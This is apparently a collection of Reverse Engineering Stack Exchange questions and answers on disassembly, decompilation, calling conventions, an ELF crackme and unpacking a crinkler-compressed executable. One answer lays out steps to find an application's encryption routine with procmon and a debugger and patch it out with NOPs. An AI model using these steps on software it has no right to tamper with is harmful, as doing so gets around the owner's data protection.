.... SNIP ...

configSpace-&gt;vtable-&gt;tmRegisterAccess_ConfigSpace__tmIGetReg(
        configSpace,
        &amp;address,
        4,
        configSpaceBuffer,
        256u,
        0)

 _this-&gt;field_4A = v74;
 _this-&gt;field_4C = *(unsigned __int16 *)configSpaceBuffer;
 _this-&gt;field_4E = v75;
 _this-&gt;field_50 = v77;
 _this-&gt;field_52 = v76;
</code></pre>

<p>Is it possible to fix the detected function variables to show the following instead?</p>

<pre><code> _this-&gt;field_4A = configSpaceBuffer[0];
 _this-&gt;field_4C = configSpaceBuffer[1];
 _this-&gt;field_4E = configSpaceBuffer[2];
 _this-&gt;field_50 = configSpaceBuffer[6];
 _this-&gt;field_52 = configSpaceBuffer[8];
</code></pre>
","<p>I found the solution. Double click the variable name (<code>configSpaceBuffer</code> in this case) which brings up the stack window for the method where you can undefine the invalid variables and then define it as an array.</p>

<p>Here is the output after this change:</p>

<pre><code>      _this-&gt;ConfigSpace1 = configSpaceBuffer[1];
      _this-&gt;ConfigSpace0 = configSpaceBuffer[0];
      _this-&gt;ConfigSpace4 = LOBYTE(configSpaceBuffer[4]);
      _this-&gt;ConfigSpace23 = configSpaceBuffer[23];
      _this-&gt;ConfigSpace22 = configSpaceBuffer[22];
</code></pre>
","2753"
"Matching ActionScript byte code to the Disassembly of a Shockwave Flash","601","","<p>There are lots of programs I seen that can locate a swf running in memory, capture it and return source code. Usually the AS byte code is generated as well.</p>

<p>What I looking to do is the opposite, I'm trying to match a section of Action Script byte-code to a section of disassembly from a Shockwave Flash program. </p>

<p>Basically match p-code to disassembly.</p>

<p>Is there any good techniques or software that can do this.</p>
","<p><a href=""http://www.free-decompiler.com/flash/"" rel=""nofollow noreferrer"">JPEXS Free Flash Decompiler</a> appears to have this functionality.</p>

<p>From <a href=""http://www.free-decompiler.com/flash/features.html"" rel=""nofollow noreferrer"">http://www.free-decompiler.com/flash/features.html</a> --</p>

<blockquote>
  <ul>
  <li>Displaying ActionScript code on the left, p-code on the right</li>
  <li>Clicking AS item hilights position in p-code and vice-versa</li>
  </ul>
</blockquote>

<p><img src=""https://i.stack.imgur.com/LsJbx.png"" alt=""enter image description here""></p>
","6450"
"reversing apk - getting native code in classes.dex","601","","<p>I've start reversing some android application. I have a little experience in this subject, but i got stuck on a little matter.</p>

<p>The app i'm trying to reverse uses <strong>JNI</strong> (java native interface), meaning some of the code is not java - it is assembly.. To my knowing, the native code should be somewhere in the <strong>classes.dex</strong> file too (together with the dalvik bytecode).</p>

<p>My problem is that the tool i'm using that knows to convert the dex file into a java code (<strong>dex2jar</strong>) doesn't seem to know how to handle the native code inside the <strong>classes.dex</strong> file. So my questions are: Is there any tool that knows to do this conversion? If not, does someone have general knowledge about the whereabouts of native code in dex files (if it is there)?</p>
","<p>No, native code isn't in classes.dex. If an android apk file has native code, the apk itself, when unzipping, should have a <code>lib</code> subdirectory, which may have architecture-dependent subdirectories  <code>armeabi</code>. <code>armeabi-v7a</code>. <code>x86</code> and possibly others, and those will contain the native code objects. Sometimes, shared objects may be in other directories as well, especially if they belong to some libraries the application linked in.</p>

<p>For example, i unzipped the apk of one application that i know to have native code:</p>

<pre><code>$ unzip -l net.skoobe.reader-1.apk
[ stuff omitted ]    
     2291  2016-03-14 10:27   NDK_LICENSES
    18549  2016-03-14 10:27   assets/www/error.js
   345568  2016-03-14 10:27   assets/armeabi/lib64libcrittercism-v3.so
   308716  2016-03-14 10:27   assets/armeabi-v7a/lib64libcrittercism-v3.so
   345696  2016-03-14 10:27   assets/arm64-v8a/lib64libcrittercism-v3.so
     5088  2016-03-14 10:25   lib/armeabi/librsjni.so
  2890256  2016-03-14 10:26   lib/armeabi/libskoobe.so
     5088  2016-03-14 10:25   lib/armeabi/libRSSupport.so
  2792064  2016-03-14 10:26   lib/armeabi-v7a/libskoobe.so
  4555592  2016-03-14 10:26   lib/x86/libskoobe.so
    18560  2015-03-26 19:09   lib/armeabi-v7a/librsjni.so
   420320  2015-03-26 19:09   lib/armeabi-v7a/libRSSupport.so
    26636  2015-03-26 19:09   lib/x86/librsjni.so
   518512  2015-03-26 19:09   lib/x86/libRSSupport.so
   159719  2016-03-14 10:27   META-INF/MANIFEST.MF
[ more stuff omitted ]    
</code></pre>
","13048"
"What is the correct disassembly for ARM7 opcode E1F120D1?","601","","<p>I'm writing a disassembler for ARM opcodes and I'm struggling with a particular encoding. The offending instruction is <code>E1F120D1</code>. I think I've followed the instructions closely, and expect the disassemble to be <code>mvns r2,r1</code> but trying it on <a href=""http://www.onlinedisassembler.com"" rel=""nofollow"">http://www.onlinedisassembler.com</a> gives me <code>ldsrb r2,[r1,#1]!</code>. </p>

<p>It seems like the low-order <code>20D1</code> in the instruction is causing online disassembler ti switch from <code>mvn</code> to <code>ldrsb</code>. Is this a bug in the disassembler -- not likely -- or my misunderstanding the instruction encodings in the manual?</p>
","<p>If you look at the ARM Architecture Reference Manual, you should be able to see that Chapter A5 takes you through the decoding of ARM instructions.</p>

<p>Starting with table A5-1, your instruction has -</p>

<pre><code>cond (31-28) = 1110
op1 (27-25) =  000
</code></pre>

<p>This matches </p>

<pre><code>cond = not 1111, op1 = 00x  =&gt; Data Processing &amp; Miscellaneous instructions (A5.2)
</code></pre>

<p>Then for table A5-2 in section A5.2, your instruction has -</p>

<pre><code>op (25) = 0
op1 (24-20) = 11111
op2 (7-4) = 1101
</code></pre>

<p>The encoding that matches these bits is -</p>

<pre><code>op = 0, op1 = not 0xx1x, op2 = 11x1 =&gt; Extra load/store instructions (A5.2.8)
</code></pre>

<p>Finally for table A5-10 in section A5.2.8, your instruction has -</p>

<pre><code>op2 (6-5) = 10
op1 (24-20) = 11111
Rn (19-16) = 0001
</code></pre>

<p>This matches</p>

<pre><code>op2 = 10, op1 = xx1x1, Rn = not 1111 =&gt; LDRSB (immediate)
</code></pre>

<p>So, yes, bits 7-4 definitely affect the decoding of this instruction.</p>
","8861"
"Reversing encryption by analysing executable","599","","<p>I have a program that reads data from a file, parses/organizes it, and spits it out as an encrypted XML. The application can also take an encrypted XML and spit out the original file. My objective at this point would be to access the clear-text XML (I'm not interested in the clear text original file as it's not XML organized)</p>

<p>I have no idea what the encryption is yet although one guy on a forum said it was AES-128 (not sure how he got to that conclusion).</p>

<p>I ran PEiD with the KANAL plugin on the application, it doesn't detect any encryption signatures.</p>

<p>Because I have access to the program and some past some experience with exploiting BO on WinXP with some knowledge of ASM, I figured I could give it a try using a debugger.</p>

<p>In a nutshell, what are the general steps I should be following to figure this out? In this situation would it be best to start looking for the encryption key itself, or find a way to use the application's encrypt/decrypt functions to my advantage?</p>
","<p>There are typically many ways to start, and which one you want to use depends on your experience. Also, what works for one target might fail on another, and vice versa. What i'd start with is:</p>

<ul>
<li>Use signsrch to check if the executable has a standard encryption algorithm linked in. Note that this might yield false positives (if the application links openssl, for example, you might find signatures of many algorithms even if only one or two of them get used)</li>
<li>Check for strings in the file that relate to encryption, and google for them. Maybe this helps to find which encryption library was used. For example, the string <code>SHA-%d test #%d:</code> quickly leads to the <code>polarssl</code> source code.</li>
<li>Trace the application while running procmon. You will probably find a sequence of <code>CreateFile</code>, multiple <code>WriteFile</code> and a <code>CloseFile</code> call, when writing the encrypted file, and the same with <code>ReadFile</code> when reading the encrypted file. In some cases, the parameters of these calls give you a hint already; for example, if the first <code>WriteFile</code> has a byte count of 32, and every following call 4096, this could be a hint that the first 32 bytes are a 256-bit key.</li>
<li>Check the stack when a call to <code>ReadFile</code> or <code>WriteFile</code> happens, You can do this by placing a breakpoint there while running the application under a debugger, or (much easier imho) look at the stack for several of the <code>procmon</code> calls. This gives you a hint of which chain of functions encrypts the file and writes it.</li>
<li><p>Pay attention to the stack differences in the <code>CreateFile</code>, <code>WriteFile</code> on the encrypted file, and possibly <code>WriteFile</code> on something else. These might as well give you hint which is your encryption function. For example:</p>

<ul>
<li>The <code>CreateFile</code> for the encrypted file has the stack <code>ABCDEFGH</code></li>
<li>The <code>WriteFile</code> for the encrypted file has the stack <code>ABCIJKLM</code></li>
<li>The <code>WriteFile</code> for something else has the stack <code>ABNOPKLM</code></li>
</ul>

<p>where each letter is one stack entry. In this case, i'd assume <code>KLM</code> to be part of the runtime library (<code>fwrite</code>, <code>write</code>, ....), since unrelated <code>WriteFile</code>s share it, <code>C</code> to be the main writer function (as it's the last to call <code>CreateFile</code> and <code>WriteFile</code>), and <code>I</code> and <code>J</code> the functions that encrypt and write.</p></li>
<li>Load the file into IDA, or OllyDbg, and have a closer look at <code>C</code>, <code>I</code> and <code>J</code>. Which other functions do they call? Are some of these functions the same ones you identified with signsrch earlier?</li>
<li>Run the file under the control of IDA, or OllyDbg, and place breakpoints on <code>C</code>, <code>I</code>, <code>J</code>, and maybe some of the functions you found with signsrch. Check the parameters on entry and exit from these functions. Do some of them ring a bell? Does one of the functions has a parameter that is a pointer to a buffer which looks like XML before the function is called, and garbage after it's called? Or vice versa when reading? Congrats, you've just found the function that does the encryption.</li>
<li>When you found the function that does the encryption, instead of figuring out how it works, it <em>might</em> just be easier to replace the call to it with a series of <code>NOP</code>s (beware of return codes though, maybe you need to set <code>eax</code> to something). Bingo, you have a program that writes plain XML instead of encrypted XML now, without ever figuring out the details of the encryption and having to write one single line of code (unless you consider a series of <code>NOP</code>s code, that is).</li>
</ul>
","9171"
"How calls work in x86","598","","<p>I am studying some X86 code and I often see calls:</p>

<pre><code>call sym.imp.printf
call sym.imp.scanf
call sym.imp.strcmp
call sym.imp.__stack_chk_fail
</code></pre>

<p>Those examples are the most common calls.
But how do they actually work?
I mean, I know they are system calls, also printf along with scanf, strcmp are C functions. But my question is where do they get the parameters from?</p>

<p>sym.imp.strcmp: where is it getting strings from to compare?</p>

<p>Where is the value of scanf saved?</p>

<p>And also, what does the call sym.imp.__stack_chk_fail does?</p>
","<p><strong>System calls vs. function calls</strong></p>

<blockquote>
  <p>I mean, I know they are system calls, also printf along with scanf, strcmp are C functions.</p>
</blockquote>

<p>Many C library functions are wrappers around system calls. <code>printf</code> and <code>scanf</code> are are examples of this. However, it should not be assumed that all C library functions execute system calls, as none of the <code>string.h</code> library functions, including <code>strcmp</code>,  execute any system calls.</p>

<blockquote>
  <p>A system call is a controlled entry point into the kernel, allowing a process to request that the kernel perform some action on the process’s behalf. The kernel makes a range of services accessible to programs via the system call application programming interface (API).<sup>1</sup></p>
</blockquote>

<p>The mechanism by which system calls are made is quite different than by that which function calls are made:</p>

<blockquote>
  <p>The [C library] wrapper function executes a trap machine instruction (<code>int 0x80</code>), which causes the processor to switch from user mode to kernel mode and execute code pointed to by location <code>0x80</code> (128 decimal) of the system’s trap vector.</p>
  
  <p>More recent x86-32 architectures implement the <code>sysenter</code> instruction, which provides a faster method of entering kernel mode than the conventional int <code>0x80</code> trap instruction. The use of <code>sysenter</code> is supported in the 2.6 kernel and from glibc 2.3.2 onward.<sup>1</sup></p>
</blockquote>

<p>Here is a visual depiction of the C library function <a href=""http://man7.org/linux/man-pages/man2/execve.2.html"" rel=""nofollow noreferrer""><code>execve</code></a> being executed, in which <code>execve</code> makes a system call:</p>

<p><a href=""https://i.stack.imgur.com/tFy5U.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/tFy5U.png"" alt=""TLPI steps in executing a system call""></a></p>

<p><strong>x86 calling conventions</strong></p>

<p>When a function is called, flow of control branches to a different location in memory via the <code>call</code> instruction:</p>

<blockquote>
  <p>Saves procedure linking information on the stack and branches to the procedure (called procedure) specified with the destination (target) operand. The target operand specifies the address of the first instruction in the called procedure. This operand can be an immediate value, a general purpose register, or a memory location.<sup><a href=""https://c9x.me/x86/html/file_module_x86_id_26.html"" rel=""nofollow noreferrer"">2</a></sup></p>
</blockquote>

<p>Here is some simple example code:</p>

<pre><code>0804841d &lt;main&gt;:
 804841d:       55                      push   %ebp
 804841e:       89 e5                   mov    %esp,%ebp
 8048420:       83 e4 f0                and    $0xfffffff0,%esp
 8048423:       83 ec 20                sub    $0x20,%esp
 8048426:       c7 44 24 18 f0 84 04    movl   $0x80484f0,0x18(%esp)
 804842d:       08 
 804842e:       c7 44 24 1c 04 00 00    movl   $0x4,0x1c(%esp)
 8048435:       00 
 8048436:       8b 44 24 18             mov    0x18(%esp),%eax
 804843a:       89 44 24 08             mov    %eax,0x8(%esp)         &lt;--- argument 3
 804843e:       8b 44 24 1c             mov    0x1c(%esp),%eax
 8048442:       89 44 24 04             mov    %eax,0x4(%esp)         &lt;--- argument 2
 8048446:       c7 04 24 0a 85 04 08    movl   $0x804850a,(%esp)      &lt;--- argument 1
 804844d:       e8 9e fe ff ff          call   80482f0 &lt;printf@plt&gt;   &lt;--- function call
 8048452:       b8 00 00 00 00          mov    $0x0,%eax
 8048457:       c9                      leave  
 8048458:       c3                      ret
</code></pre>

<p>Here, the memory address that execution branches to when <code>printf</code> is called via <code>call</code> is <code>0x80482f0</code>.</p>

<blockquote>
  <p>But my question is where do they get the parameters from?</p>
</blockquote>

<p>Arguments are pushed onto the stack in reverse order of their corresponding parameters in the function definition prior to the function call. The return value is saved in <code>%eax</code>. This is in accordance with x86 calling convention, referred to as <a href=""https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"" rel=""nofollow noreferrer"">cdecl</a>:</p>

<blockquote>
  <p><strong>Caller Rules</strong></p>
  
  <p>To make a subrouting call, the caller should:</p>
  
  <ol>
  <li><p>Before calling a subroutine, the caller should save the contents of certain registers that are designated caller-saved. The caller-saved registers are EAX, ECX, EDX. Since the called subroutine is allowed to modify these registers, if the caller relies on their values after the subroutine returns, the caller must push the values in these registers onto the stack (so they can be restore after the subroutine returns.</p></li>
  <li><p><strong>To pass arguments to the subroutine, push them onto the stack before the call. The arguments should be pushed in inverted order (i.e. last argument first).</strong> Since the stack grows down, the first arguments will be stored at the lowest address (this inversion of arguments was historically used to allow functions to be passed a variable number of parameters).</p></li>
  <li><p>To call the subroutine, use the call instruction. This instruction places the return address on top of the arguments on the stack, and branches to the subroutine code. This invokes the subroutine, which should follow the callee rules below.</p></li>
  </ol>
  
  <p><strong>After the subroutine returns (immediately following the call instruction), the caller can expect to find the return value of the subroutine in the register EAX</strong>. To restore the machine state, the caller should:</p>
  
  <ol>
  <li>Remove the arguments from stack. This restores the stack to its state before the call was performed.</li>
  <li>Restore the contents of caller-saved registers (EAX, ECX, EDX) by popping them off of the stack. The caller can assume that no other registers were modified by the subroutine. <sup><a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html#calling"" rel=""nofollow noreferrer"">3</a></sup></li>
  </ol>
</blockquote>

<p>For a more in-depth discussion of x86 calling conventions, refer to the x86 ABI documentation found in the <a href=""http://refspecs.linuxbase.org/elf/abi386-4.pdf"" rel=""nofollow noreferrer"">System V Application Binary Interface Intel386 Architecture Processor Supplment, Fourth Edition</a>.</p>

<p><strong><code>__stack_chk_fail</code> and stack guards</strong></p>

<blockquote>
  <p>And also, what does the call sym.imp.__stack_chk_fail does?</p>
</blockquote>

<p><code>__stack_chk_fail</code> is called when the <a href=""https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries"" rel=""nofollow noreferrer"">stack canary</a> has been overwritten due to a buffer overflow:</p>

<blockquote>
  <p>The basic idea behind stack protection is to push a ""canary"" (a randomly chosen integer) on the stack just after the function return pointer has been pushed. The canary value is then checked before the function returns; if it has changed, the program will abort. Generally, stack buffer overflow (aka ""stack smashing"") attacks will have to change the value of the canary as they write beyond the end of the buffer before they can get to the return pointer. Since the value of the canary is unknown to the attacker, it cannot be replaced by the attack. Thus, the stack protection allows the program to abort when that happens rather than return to wherever the attacker wanted it to go.<sup><a href=""https://lwn.net/Articles/584225/"" rel=""nofollow noreferrer"">4</a></sup></p>
</blockquote>

<p>Here is some example annotated code:</p>

<pre><code>000000000040055d &lt;test&gt;:
  40055d:   55                      push   %rbp
  40055e:   48 89 e5                mov    %rsp,%rbp
  400561:   48 83 ec 20             sub    $0x20,%rsp
  400565:   89 7d ec                mov    %edi,-0x14(%rbp)
  400568:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax     &lt;- get guard variable value
  40056f:   00 00 
  400571:   48 89 45 f8             mov    %rax,-0x8(%rbp)   &lt;- save guard variable on stack
  400575:   31 c0                   xor    %eax,%eax
  400577:   8b 45 ec                mov    -0x14(%rbp),%eax
  40057a:   48 8b 55 f8             mov    -0x8(%rbp),%rdx   &lt;- move it to register
  40057e:   64 48 33 14 25 28 00    xor    %fs:0x28,%rdx     &lt;- check it against original
  400585:   00 00 
  400587:   74 05                   je     40058e &lt;test+0x31&gt;
  400589:   e8 b2 fe ff ff          callq  400440 &lt;__stack_chk_fail@plt&gt; 
  40058e:   c9                      leaveq 
  40058f:   c3                      retq   
</code></pre>

<hr>

<p><sub>1. The Linux Programming Interface, Chapter 3 ""System Programming Concepts""</sub></p>

<p><sub>2. <a href=""https://c9x.me/x86/html/file_module_x86_id_26.html"" rel=""nofollow noreferrer"">x86 Instruction Set Reference - CALL</a> - c9x.me</sub></p>

<p><sub>3. <a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html#calling"" rel=""nofollow noreferrer"">x86 Assembly Guide</a> - University of Virginia Computer Science</sub></p>

<p><sub>4. <a href=""https://lwn.net/Articles/584225/"" rel=""nofollow noreferrer"">""Strong"" stack protection for GCC</a> - LWN.net</sub></p>
","15647"
"IDA Pro Export C style array using Python instead of GUI menu","598","","<p>IDA Pro 6.95. From the menu I can use Edit... Export data... C unsigned char array (hex).</p>

<p>I want to do this in a Python script without rewriting what already works.</p>

<p>I have looked for a way to find a list of the commands I have performed through the GUI menus, but export data is not the sort of thing that appears in an IDC file.</p>
","<p>Because this is a relatively basic functionality, there's not builtin way to call that command from IDAPython. You could do some Qt trickery to fake that GUI menu being clicked by the user, but that seems too much effort.</p>

<p>To me it seems as if the easiest and cleanest solution here is to simply call <code>idaapi.get_many_bytes</code> to get the buffer of data you're interesting in dumping, and then format it however you'd like.</p>

<p>for example, the following code snippet will output the binary data as a hexadecimal string:</p>

<pre><code>buf = idaapi.get_many_bytes(start, end)
buf.encode('hex')
</code></pre>

<p>Or to get a c-like array:</p>

<pre><code>buf = idaapi.get_many_bytes(start, end)
buf = buf.encode('hex')
two_hex_char_seq = map(operator.add, buf[::2], buf[1::2])
c_array = ""{0x"" + "", 0x"".join(two_hex_char_seq) + ""}""
</code></pre>

<p>Which will give an output similar to:</p>

<pre><code>{0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30}
</code></pre>
","14593"
"Illegal entry point of an ELF file","598","","<p>I have encountered a quite obscure 32-bit ELF file (that is a crackme) and I still cannot figure out how can it execute. First, beside some ""understandable"" property that it has not any section:</p>

<pre><code># readelf --sections SimpleVM

There are no sections in this file.
</code></pre>

<p>Considering the segments:</p>

<pre><code># readelf --segments SimpleVM

Elf file type is EXEC (Executable file)
Entry point 0xc023dc
There are 2 program headers, starting at offset 52

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  LOAD           0x000000 0x00c01000 0x00c01000 0x013c7 0x013c7 RWE 0x1000
  LOAD           0x00019c 0x0804b19c 0x0804b19c 0x00000 0x00000 RW  0x1000
</code></pre>

<p>I observe that the first segments <code>LOAD</code> has size <code>0x13c7</code> bytes, and mapped into memory at <code>0xc01000</code>; the second one is not important because its size is zero. But, the entry point of the ELF file is at <code>0xc023dc</code>, that means outside any segment <code>LOAD</code>!!!</p>

<p>I use also IDA 6.8 (evaluation ver.) to load this file, and IDA says that the entry point is illegal.</p>

<p>Since the program has no <code>INTERP</code> segment, the first executed instruction must be at <code>0xc023dc</code>. But this address is outside any ""reliably"" mapped data, we cannot sure which instruction will be executed. I think that this ELF should have some random behaviors (e.g. it should be crashed usually), but it is not, it executes normally, without any crash.</p>

<p>So my question is: how can this happen?</p>

<p>NB1. In case of someone wants to look at this file, I give the link <a href=""https://app.box.com/s/xbyc5r7ladg8uvvr4plwcczkdiubqn3g/"" rel=""nofollow"" title=""here"">here</a>, but please do not give directly the solution. I want to handle it myself.</p>

<p>NB2. Using a Pintool to trace out what happens, I find the <code>OEP</code> of the program is at <code>0xc01dfa</code> since its trace is:</p>

<pre><code>0xc023dc  mov dword ptr [0xc01bf0], 0x252e8 &lt;=== modify address 0xc01bf0
0xc023e6  jmp 0xc01bf0
0xc01bf0  call 0xc01e47                     &lt;=== modified instruction
0xc01e47  pop ebp                           &lt;=== OEP
0xc01e48  call 0xc01dfa
0xc01dfa  pop esi
0xc01dfb  lea eax, ptr [ebp-0x9]
0xc01dfe  mov edi, dword ptr [eax]
0xc01e00  sub eax, edi
0xc01e02  mov edx, eax
0xc01e04  add eax, dword ptr [eax+0x48]
0xc01e07  add eax, 0xfff
0xc01e0c  and eax, 0xfffff000
0xc01e11  push 0x1
0xc01e13  push eax
....
</code></pre>

<p>But I still cannot understand why the instruction at <code>0xc023dc</code> is always <code>mov dword ptr [0xc01bf0], 0x252e8</code> (so the binary is somehow ""self-modified"")</p>
","<p>File/memory mappings are always multiples of the page size, on x86 this is usually 4k. The mapping length here, <code>0x13c7</code> will be rounded up to a multiple of the page size meaning that <code>0x2000</code> bytes will be mapped. If you look the raw file at offset <code>0x13dc</code> you should find these 'extra' instructions.
The rounding up to page size is necessary because the memory manager and processor page tables work on 4k granularity to reduce the overhead of memory management.</p>

<p>There is self-modification going on too. It is the write to memory from the instruction at <code>0xc023dc</code> which creates the CALL (0xE8) instruction you see at address <code>0xC01BF0</code>.  This won't be in the raw file.   The write to the code is possible because the code is, unusually, mapped with write (<code>W</code>) access in the program header.</p>
","10895"
"Calculating check sum of m-bus data frame","597","","<p>I'm trying to calculate the check sum of a m-bus data frame. In page 1 of <a href=""http://bg-etech.de/download/manual/SDM630-Mbus-protocol.pdf"" rel=""nofollow"">this PDF</a> I'm able to read that the frame's check sum ""is calculated from the arithmetical sum of the data mentioned above, without taking carry digits into account"". The data I have above are the bytes:</p>

<ol>
<li>Start</li>
<li>L Field</li>
<li>L Field</li>
<li>Start</li>
<li>C Field</li>
<li>A Field</li>
<li>CI Field</li>
<li>Check sum</li>
<li>Stop</li>
</ol>

<p>In page 2 we can find that one example of a valid data frame is:</p>

<pre><code>68 03 03 68 53 01 BB 0F 16
</code></pre>

<p>In hexadecimal, being 0F the check sum. Unfortunately I must be doing something wrong because I'm not able to reach that value.</p>

<p>Could someone explain how this algorithm, to find the check sum, works?</p>
","<p>just one sample is never sufficient to answer a checksum query you need a bunch of samples to corelate and find patterns  </p>

<p>so looking at the linked pdf it seems it is clear enough</p>

<p>skip the start and sum the data and extract the least two bytes </p>

<pre><code>skip     sum     mask 
x,x,x,x | y,y,... 0x000000ff = checksum
</code></pre>

<p>so the sample you posted would be </p>

<pre><code>skip         | sum            
68 , 3 ,3 68 | 53 , 01 , bb |  =
</code></pre>

<p>checksum</p>

<pre><code>""{0:X2}"" -f ((0x53+0x1+0xbb) -band 0x000000ff) = 0x0f seems to match 
</code></pre>

<p>running this on other sequnces in the pdf seem to tally</p>

<pre><code>PS C:\&gt; $a = ""{0:X2}"" -f ((0x53+0xfe+0x51+0x01+0x7a+0x01) -band 0x000000ff) ; $a
1E 
PS C:\&gt; $a = ""{0:X2}"" -f ((0x73+0x01+0x51+0x01+0x7A+0x02 ) -band 0x000000ff) ; $a
42
</code></pre>
","11380"
"Trying to decompress a hello world program using OllyDbg v201","597","","<p>I'm trying to learn how to unpack a simple executable which has been compressed with <a href=""http://crinkler.net/"" rel=""nofollow noreferrer"">crinkler</a>, let be the nasm listing here compressed with crinkler.</p>

<p><strong>example1.asm</strong>:</p>

<pre><code>global start
; kernel32.lib Exports
extern _ExitProcess@4
extern _GetStdHandle@4
extern _WriteFile@20

section .text

start:
    ; DWORD  bytes;
    mov     ebp, esp
    sub     esp, 4

    ; hStdOut = GetstdHandle( STD_OUTPUT_HANDLE)
    push    -11
    call    _GetStdHandle@4
    mov     ebx, eax

    ; WriteFile( hstdOut, message, length(message), &amp;bytes, 0);
    push    0
    lea     eax, [ebp-4]
    push    eax
    push    (message_end - message)
    push    message
    push    ebx
    call    _WriteFile@20

    ; ExitProcess(0)
    push    0
    call    _ExitProcess@4

    ; never here
    hlt
message:
    db      'Hello, World', 10
message_end:
</code></pre>

<p>To generate the exe I'm using latest version of <a href=""http://www.nasm.us/pub/nasm/releasebuilds/2.12.03rc1/win64/nasm-2.12.03rc1-win64.zip"" rel=""nofollow noreferrer"">nasm</a> &amp; <a href=""http://crinkler.net/crinkler20.zip"" rel=""nofollow noreferrer"">crinkler</a> like this <code>nasm -f win32 example1.asm &amp;&amp; crinkler example1.obj kernel32.lib user32.lib opengl32.lib winmm.lib gdi32.lib legacy_stdio_definitions.lib oldnames.lib ucrt.lib /out:example1_crinkler.exe /CRINKLER /HASHTRIES:300 /COMPMODE:SLOW /ORDERTRIES:4000 /entry:start /subsystem:console</code></p>

<p>To unpack the exe I'm using <a href=""http://www.ollydbg.de/version2.html"" rel=""nofollow noreferrer"">OllyDbg v201</a> and the latest version of <a href=""https://low-priority.appspot.com/ollydumpex/OllyDumpEx.zip"" rel=""nofollow noreferrer"">OllyDumpEx v1.50</a>. Problem here is, the OllyDebugEx's website only has these sections {Overview, Features, Screenshots, Supported Debuggers, Download, Changelog}, no documentation at all, which means the plugin assumes you've already experience with the whole bunch of options/terms.</p>

<p>Right now I've reached the point where I've figured out how to uncompress my test executable and finding the OEP, current status below:</p>

<p><a href=""https://i.stack.imgur.com/fvVld.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/fvVld.png"" alt=""enter image description here""></a></p>

<p>What I'd like to know now is understand the whole set of available options provided by OllyDumpEx:</p>

<ul>
<li>Module {PE Base, List Section, Dump Mode, PE Source}</li>
<li>Search { Search Area, Search Mode}</li>
<li>PE {Image Base, Section Align, Entry Point}</li>
<li>Options</li>
<li>Section</li>
</ul>

<p>Once I know how to dump it properly I'd also like to know how to fix it so I'll get the final uncompressed exe.</p>
","<p>Just out of curiosity i downloaded crinkler 
compiled this code with visual c++</p>

<pre><code>#include &lt;windows.h&gt;
int WINAPI WinMain(__in HINSTANCE,__in_opt HINSTANCE,__in LPSTR,__in int) {
    MessageBox(NULL, ""Testing Crinky"", ""CRINKLE"", MB_OK);
    ExitProcess(NULL);
}
</code></pre>

<p>and linked the object file  with crinkler20.exe</p>

<p>with </p>

<pre><code>cl -c /nologo /W4 /O1 /Zi /analyze *.cpp

crinkler.exe /ENTRY:WinMain crinky.obj kernel32.lib user32.lib /CRINKLER /HASHTRIES:300 /COMPMODE:SLOW /ORDERTRIES:4000 /SUBSYSTEM:windows /out:crinky.exe
</code></pre>

<p>it created a 459 byte exe which runs fine</p>

<pre><code>ls -la crinky.exe
-rwxrwxrwx  1 HP 0 459 2016-11-15 15:25 crinky.exe
</code></pre>

<p><a href=""https://i.stack.imgur.com/mM86g.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/mM86g.png"" alt=""enter image description here""></a></p>

<p>opened it in a hexeditor to see whats inside it appears crinkler employs 
pe header damaging techniques (it seems to use the peheader to stuff code )</p>

<p>here is a hexedit view (from hxd)</p>

<pre><code>Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000  4D 5A 32 30 50 45 00 00 4C 01 00 00 01 DB 61 7F  MZ20PE..L....Ûa.
00000010  10 D0 17 73 75 47 EB F9 08 00 02 00 0B 01 11 C9  .Ð.suGëù.......É
00000020  45 85 C0 79 1F 01 D3 50 F7 E2 90 3D 5C 00 00 00  E…Ày..ÓP÷â.=\...
00000030  F7 F3 39 C1 19 DB EB 48 00 00 40 00 04 00 00 00  ÷ó9Á.ÛëH..@.....
00000040  04 00 00 00 0F A3 2D 29 01 40 00 8D 04 00 EB CE  .....£-).@....ëÎ
00000050  00 00 00 00 EB B6 42 06 40 00 00 00 53 31 ED BB  ....ë¶B.@...S1í»
00000060  02 00 00 00 90 BE 14 01 40 00 6A 01 58 BF 00 00  .....¾..@.j.X¿..
00000070  42 00 B1 00 90 57 EB 12 00 00 00 00 00 00 00 00  B.±..Wë.........
00000080  5A 72 07 92 29 D1 04 00 29 D0 60 AD 01 F8 74 2C  Zr.’)Ñ..)Ð`..øt,
00000090  6A 0A 5A 89 14 54 89 54 24 10 AD 31 ED 4D 45 01  j.Z‰.T‰T$..1íME.
000000A0  C0 72 FB 74 AF 60 AC 88 C2 32 07 6B C0 6F 02 87  Àrût¯`¬ˆÂ2.kÀo.‡
000000B0  00 00 00 00 48 4F 00 D2 72 EF 75 F9 BF CE 00 42  ....HO.Òrïuù¿Î.B
000000C0  00 B9 F5 E9 1F 03 73 0C F3 66 AB 0A 06 61 8D 76  .¹õé..s.óf«..a.v
000000D0  0C 7B B7 C3 F7 F1 8D 3C 57 89 E9 31 C0 AE 74 04  .{·Ã÷ñ.&lt;W‰é1À®t.
000000E0  00 07 75 02 41 41 0F B6 14 07 D3 E2 01 54 84 34  ..u.AA.¶..Óâ.T„4
000000F0  48 7A F3 85 DB 7F 0D D0 2C 1F 75 03 D0 14 1F F7  Hzó…Û..Ð,.u.Ð..÷
00000100  D3 FE 04 1F 61 46 EB 95 E8 6A A6 38 C6 6F 82 E9  Óþ..aFë•èj¦8Æo‚é
00000110  1B 13 09 4F 55 FF BD FF FE FF FF 9A 00 20 80 90  ...OUÿ½ÿþÿÿš. €.
00000120  32 FF BD FF FF FF FF DF 00 44 BE 63 EE 28 9E 30  2ÿ½ÿÿÿÿß.D¾cî(ž0
00000130  07 9C 4B 16 0D 6B A8 05 A4 65 86 46 50 14 FE B3  .œK..k¨.¤e†FP.þ³
